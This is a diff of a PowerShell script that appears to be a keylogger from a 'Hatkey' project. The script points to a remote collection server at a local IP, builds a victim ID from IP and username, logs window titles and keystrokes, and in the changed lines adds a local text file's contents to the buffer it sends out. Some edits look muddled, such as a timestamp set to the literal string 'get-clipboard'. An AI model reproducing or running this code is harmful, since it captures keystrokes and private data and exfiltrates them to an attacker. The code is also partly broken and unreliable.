@@ -1,4 +1,4 @@
-$server = 'http://192.168.1.41:8080'
+$server = 'http://192.168.1.41:4040'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
@@ -159,12 +159,13 @@ while ($true) {
 			if ($unicode_res -gt 0) {
 				if ($WindowTitle -ne $LastWindowTitle){
 					# if the window has changed
-					$TimeStamp = ("C:\Users\Mehmet Dere\Downloads\Hatkey-master\System\random.txt")
+					$TimeStamp = ("get-clipboard")
 					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
+                    $outfile += get-item "C:\Users\Mehmet Dere\Desktop\Yeniklasör\vrsc.txt"
 				$Outout += $mychar.ToString()
-				$buff += $Outout
+				$buff += $outfile
 			}
 		}
 	}
